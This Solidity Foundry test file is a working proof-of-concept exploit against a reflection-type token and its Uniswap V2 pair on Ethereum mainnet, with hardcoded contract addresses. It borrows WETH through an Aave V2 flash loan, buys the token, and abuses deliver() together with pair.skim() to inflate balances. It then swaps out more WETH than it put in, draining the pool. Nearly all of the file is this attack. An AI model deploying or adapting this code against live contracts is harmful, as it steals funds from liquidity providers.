// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/IPoolV2.sol";
import "../src/IFlashLoanReceiver.sol";
import "../src/IERC20.sol";
import "../src/IUniswapV2Router.sol";
import "../src/IUniswapV2Pair.sol";

interface IWETH is IERC20 {
    function withdraw (uint256 _wag) external;
}

interface IReflaction {
    function deliver(uint256 tAmount) external;
}

contract CounterTest is  IFlashLoanReceiver, Test {

    // Addresses
    address public DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F; //Main
    address public WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;//Main 
    address public WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;//Main
    address public USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7; //Main
    address public REFLACTION = 0x71959A1688beb7ff73F39D356414f47F54B9FD1f;

    address public PAIR = 0xF4D3B484defEd381dc4D686C761aEd23431083C3;
    address public AAVE_POOLV2 = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;//Main  
    address public uniswapRouterV202 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;


    ILendingPool flashPool = ILendingPool(AAVE_POOLV2);// AAVE pool V2
    IUniswapV2Router02 router = IUniswapV2Router02(uniswapRouterV202);
    IUniswapV2Pair pair = IUniswapV2Pair(PAIR);

    IWETH weth = IWETH(WETH);

    IReflaction reflaction = IReflaction(REFLACTION);
    // IERC20 free = IERC20(FREEMOON);
    // Counter public counter;

    function setUp() public {
        // counter = new Counter();
        // counter.setNumber(0);
    }

    function testTrade() public {

        uint256 weth_amount = 200*10**18;
        weth.approve(AAVE_POOLV2, uint256(2**256-1));

        address[] memory assets = new address[](1);
        assets[0] = WETH;
        // assets[1] = WBTC;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = weth_amount;
        // amounts[1] = dai_amount;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;
        // modes[1] = 0;

        // bytes memory data = abi.encode(wbtc_amount, dai_amount, exchangeRateUpdated);

        flashPool.flashLoan(address(this), assets, amounts, modes, address(this), hex"", uint16(0));

    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,// 5%..
        address initiator,
        bytes calldata params
    ) external override returns (bool) {   
        assets;
        require(initiator == address(this), "Not waste your time ;)"); 
    
        // balanceOfThis(WETH);
        // (uint256 wbtc_amount, uint256 dai_amount, uint256 rate) = abi.decode(params,(uint256,uint256,uint256)); 
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = REFLACTION;
        weth.approve(uniswapRouterV202, uint256(2**256-1));
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(balanceOfThis(WETH),0,path,address(this),block.timestamp+8000);
        reflaction.deliver(balanceOfThis(REFLACTION));
        pair.skim(address(this));
        reflaction.deliver(balanceOfThis(REFLACTION));
        pair.swap((amounts[0]+premiums[0]), 0, address(this), hex"");
        
        return true;
    }

    function balanceOfThis(address _erc20TokenAddress) internal view returns (uint256 bal) {
        IERC20 ERC20Token;    
        ERC20Token = IERC20(_erc20TokenAddress);
   
        bal = ERC20Token.balanceOf(address(this));
        console.log("Executor Token balance", bal);
        return bal;   

    }

    // function call (address payable _to, uint256 _value, bytes calldata _data) external onlyOwner payable returns (bytes memory) {
    //     require(_to != address(0));
    //     (bool _success, bytes memory _result) = _to.call{value: _value}(_data);
    //     require(_success);
    //     return _result;
    // }

    receive()external payable {}
}
